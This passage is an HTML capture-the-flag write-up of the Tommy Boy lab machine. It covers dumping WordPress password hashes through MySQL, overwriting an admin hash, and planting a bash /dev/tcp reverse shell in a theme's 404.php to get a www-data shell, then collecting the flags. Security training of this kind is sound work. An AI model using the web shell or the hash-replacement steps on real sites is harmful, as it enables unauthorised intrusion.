+bigtommysenior@CallahanAutoSrv01:/var/www/html$ mysql -u wordpressuser -pCaptainLimpWrist\!\!\!&#13;&#10;mysql: [Warning] Using a password on the command line interface can be insecure.&#13;&#10;Welcome to the MySQL monitor.  Commands end with ; or \g.&#13;&#10;Your MySQL connection id is 323899&#13;&#10;Server version: 5.7.13-0ubuntu0.16.04.2 (Ubuntu)&#13;&#10;&#13;&#10;Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.&#13;&#10;&#13;&#10;Oracle is a registered trademark of Oracle Corporation and/or its&#13;&#10;affiliates. Other names may be trademarks of their respective&#13;&#10;owners.&#13;&#10;&#13;&#10;Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.&#13;&#10;&#13;&#10;mysql&gt; 
+    </pre>
+
+    <li>I take a look at the wordpress users</li>
+
+    <pre>
+mysql&gt; show databases;&#13;&#10;+--------------------+&#13;&#10;| Database           |&#13;&#10;+--------------------+&#13;&#10;| information_schema |&#13;&#10;| wordpress          |&#13;&#10;+--------------------+&#13;&#10;2 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; use wordpress&#13;&#10;Reading table information for completion of table and column names&#13;&#10;You can turn off this feature to get a quicker startup with -A&#13;&#10;&#13;&#10;Database changed&#13;&#10;mysql&gt; show tables;&#13;&#10;+-----------------------+&#13;&#10;| Tables_in_wordpress   |&#13;&#10;+-----------------------+&#13;&#10;| wp_commentmeta        |&#13;&#10;| wp_comments           |&#13;&#10;| wp_links              |&#13;&#10;| wp_options            |&#13;&#10;| wp_postmeta           |&#13;&#10;| wp_posts              |&#13;&#10;| wp_term_relationships |&#13;&#10;| wp_term_taxonomy      |&#13;&#10;| wp_termmeta           |&#13;&#10;| wp_terms              |&#13;&#10;| wp_usermeta           |&#13;&#10;| wp_users              |&#13;&#10;+-----------------------+&#13;&#10;12 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; select * from wp_users;&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;| ID | user_login | user_pass                          | user_nicename | user_email               | user_url                                    | user_registered     | user_activation_key | user_status | display_name      |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;|  1 | richard    | $P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ. | richard       | richard@callahanauto.tb  |                                             | 2016-07-06 20:49:04 |                     |           0 | richard           |&#13;&#10;|  2 | tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. | tom           | tom@callahanauto.tb      | https://en.wikipedia.org/wiki/Brian_Dennehy | 2016-07-06 20:51:09 |                     |           0 | Big Tom           |&#13;&#10;|  3 | tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. | tommy         | littletom@callahan.tb    | http://www.imdb.com/title/tt3910602/        | 2016-07-06 21:17:30 |                     |           0 | Tom Jr.           |&#13;&#10;|  4 | michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ | michelle      | michelle@callahanauto.tb |                                             | 2016-07-06 22:13:17 |                     |           0 | Michelle Michelle |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;4 rows in set (0.00 sec)
+    </pre>
+
+    <li>I am unable to crack any of the hashes.  The mysql password also never worked when I tried against other users on the box.  So I decided to replace richard's password with my own, so I can login as richard on wordpress and create a web shell.  In order to do this I find a website using google in order to generate a new wordpress hash to replace the current one with.</li>
+
+    <img src="../images/tommyboy1/wp_hash.png">
+
+    <br>
+    <br>
+
+    <li>Now we just need to edit the sql command that the website generates to target richard and enter the command into the mysql database.</li>
+
+    <pre>
+mysql&gt; UPDATE `wp_users` SET `user_pass` = &apos;$P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ.&apos; WHERE user_login = &apos;richard&apos;;&#13;&#10;Query OK, 1 row affected (0.00 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0&#13;&#10;&#13;&#10;mysql&gt; select * from wp_users;&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;| ID | user_login | user_pass                          | user_nicename | user_email               | user_url                                    | user_registered     | user_activation_key | user_status | display_name      |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;|  1 | richard    | $P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ. | richard       | richard@callahanauto.tb  |                                             | 2016-07-06 20:49:04 |                     |           0 | richard           |&#13;&#10;|  2 | tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. | tom           | tom@callahanauto.tb      | https://en.wikipedia.org/wiki/Brian_Dennehy | 2016-07-06 20:51:09 |                     |           0 | Big Tom           |&#13;&#10;|  3 | tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. | tommy         | littletom@callahan.tb    | http://www.imdb.com/title/tt3910602/        | 2016-07-06 21:17:30 |                     |           0 | Tom Jr.           |&#13;&#10;|  4 | michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ | michelle      | michelle@callahanauto.tb |                                             | 2016-07-06 22:13:17 |                     |           0 | Michelle Michelle |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;4 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; exit
+    </pre>
+
+    <li>Now we can login to wordpress (http://10.0.0.22/prehistoricforest/wp-admin/) using the credentials richard:hacked.  Once logged in we need to create a reverse shell so we can get a shell as the user www-data.  For this, we navigate to appearance > editor > 404 Template.  We create our web shell here.</li>
+
+    <img src="../images/tommyboy1/rev_shell.png">
+
+    <br>
+    <br>
+
+    <li>Then I start my netcat listener on port 80 and navigate the the 404.php page.  I find the directory for the 404.php page by searching through the files in the /var/www/html/prehistoricforest directory.</li>
+
+    <pre>
+bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ cat ./wp-content/themes/twentyfourteen/404.php&#13;&#10;&lt;?php&#13;&#10;/**&#13;&#10; * The template for displaying 404 pages (Not Found)&#13;&#10; *&#13;&#10; * @package WordPress&#13;&#10; * @subpackage Twenty_Fourteen&#13;&#10; * @since Twenty Fourteen 1.0&#13;&#10; */&#13;&#10;&#13;&#10;get_header(); ?&gt;&#13;&#10;&#13;&#10;&#13;&#10;&#9;&lt;div id=&quot;primary&quot; class=&quot;content-area&quot;&gt;&#13;&#10;&#9;&#9;&lt;div id=&quot;content&quot; class=&quot;site-content&quot; role=&quot;main&quot;&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&lt;header class=&quot;page-header&quot;&gt;&#13;&#10;&#9;&#9;&#9;&#9;&lt;h1 class=&quot;page-title&quot;&gt;&lt;?php _e( &apos;Not Found&apos;, &apos;twentyfourteen&apos; ); ?&gt;&lt;/h1&gt;&#13;&#10;&#9;&#9;&#9;&lt;/header&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&lt;div class=&quot;page-content&quot;&gt;&#13;&#10;&#9;&#9;&#9;&#9;&lt;p&gt;&lt;?php _e( &apos;It looks like nothing was found at this location. Maybe try a search?&apos;, &apos;twentyfourteen&apos; ); ?&gt;&lt;/p&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&#9;&lt;?php get_search_form(); ?&gt;&#13;&#10;&#9;&#9;&#9;&lt;/div&gt;&lt;!-- .page-content --&gt;&#13;&#10;&#13;&#10;&#9;&#9;&lt;/div&gt;&lt;!-- #content --&gt;&#13;&#10;&#9;&lt;/div&gt;&lt;!-- #primary --&gt;&#13;&#10;&#13;&#10;&lt;?php&#13;&#10;get_sidebar( &apos;content&apos; );&#13;&#10;get_sidebar();&#13;&#10;get_footer();&#13;&#10;bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ cat ./wp-content/themes/twentysixteen/404.php&#13;&#10;&lt;?php system(&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.0.0.1/80 0&gt;&amp;1&apos;&quot;); ?&gt;&#13;&#10;bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ 
+    </pre>
+
+    <li>Navigating to http://10.0.0.22/prehistoricforest/wp-content/themes/twentysixteen/404.php should connect to the netcat listener with a reverse shell as www-data.  Now we can read the flag in the root directory.</li>
+
+    <pre>
+www-data@CallahanAutoSrv01:/$ cat .5&#9;&#13;&#10;cat .5.txt &#13;&#10;FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#13;&#10;YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!&#13;&#10;OH RICHARD DON&apos;T RUN AWAY FROM YOUR FEELINGS!!!!!!!!&#13;&#10;&#13;&#10;Flag data: Buttcrack&#13;&#10;&#13;&#10;Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.&#13;&#10;So for example, if flag 1 data was &quot;hi&quot; and flag 2 data was &quot;there&quot; and flag 3 data was &quot;you&quot;&#13;&#10;you would create this blob:&#13;&#10;&#13;&#10;hithereyou&#13;&#10;&#13;&#10;Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom&apos;s&#13;&#10;folder and you can call the box PWNED.
+    </pre>
+
+    <li>I did not pay attention to flag locations as I was working on this box.  So I take a shortcut at this point.  I simply use my bigtommysenior shell (because it's SSH and so it looks better than the www-data shell) to search for the flag files in one swoop.</li>
+
+    <pre>
+bigtommysenior@CallahanAutoSrv01:/$ find / 2&gt;/dev/null | grep .txt | grep flag&#13;&#10;/var/thatsg0nnaleaveamark/NickIzL33t/flagtres.txt&#13;&#10;/var/www/html/flag-numero-uno.txt&#13;&#10;/var/www/html/prehistoricforest/thisisthesecondflagyayyou.txt&#13;&#10;/home/bigtommysenior/el-flag-numero-quatro.txt&#13;&#10;bigtommysenior@CallahanAutoSrv01:/$ cat /var/thatsg0nnaleaveamark/NickIzL33t/flagtres.txt&#13;&#10;THREE OF 5 FLAGS - you&apos;re awesome sauce.&#13;&#10;&#13;&#10;Flag data: TinyHead&#13;&#10;bigtommysenior@CallahanAutoSrv01:/$ cat /var/www/html/flag-numero-uno.txt&#13;&#10;This is the first of five flags in the Callhan Auto server.  You&apos;ll need them all to unlock&#13;&#10;the final treasure and fully consider the VM pwned!&#13;&#10;&#13;&#10;Flag data: B34rcl4ws&#13;&#10;bigtommysenior@CallahanAutoSrv01:/$ cat /var/www/html/prehistoricforest/thisisthesecondflagyayyou.txt&#13;&#10;You&apos;ve got 2 of five flags - keep it up!&#13;&#10;&#13;&#10;Flag data: Z4l1nsky&#13;&#10;bigtommysenior@CallahanAutoSrv01:/$ cat /home/bigtommysenior/el-flag-numero-quatro.txt&#13;&#10;YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal&#13;&#10;working status.&#13;&#10;&#13;&#10;Flag data: EditButton&#13;&#10;&#13;&#10;But...but...where&apos;s flag 5?  &#13;&#10;&#13;&#10;I&apos;ll make it easy on you.  It&apos;s in the root of this server at /5.txt
+    </pre>
+
+    <li>Now I follow the directions from the 5th flag and combine all the flags together to unzip the LOOT.ZIP file.</li>
+
+    <pre>
+bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP &#13;&#10;Archive:  LOOT.ZIP&#13;&#10;[LOOT.ZIP] THE-END.txt password: &#13;&#10;  inflating: THE-END.txt             &#13;&#10;bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt &#13;&#10;YOU CAME.&#13;&#10;YOU SAW.&#13;&#10;YOU PWNED.&#13;&#10;&#13;&#10;Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.&#13;&#10;&#13;&#10;GREAT WORK!&#13;&#10;&#13;&#10;I&apos;d love to know that you finished this VM, and/or get your suggestions on how to make the next &#13;&#10;one better.&#13;&#10;&#13;&#10;Please shoot me a note at 7ms @ 7ms.us with subject line &quot;Here comes the meat wagon!&quot;&#13;&#10;&#13;&#10;Or, get in touch with me other ways:&#13;&#10;&#13;&#10;* Twitter: @7MinSec&#13;&#10;* IRC (Freenode): #vulnhub (username is braimee)&#13;&#10;&#13;&#10;Lastly, please don&apos;t forget to check out www.7ms.us and subscribe to the podcast at&#13;&#10;bit.ly/7minsec&#13;&#10;&#13;&#10;&lt;/shamelessplugs&gt;&#13;&#10;&#13;&#10;Thanks and have a blessed week!&#13;&#10;&#13;&#10;-Brian Johnson&#13;&#10;7 Minute Security
+    </pre>
+
+</body>
+</html>
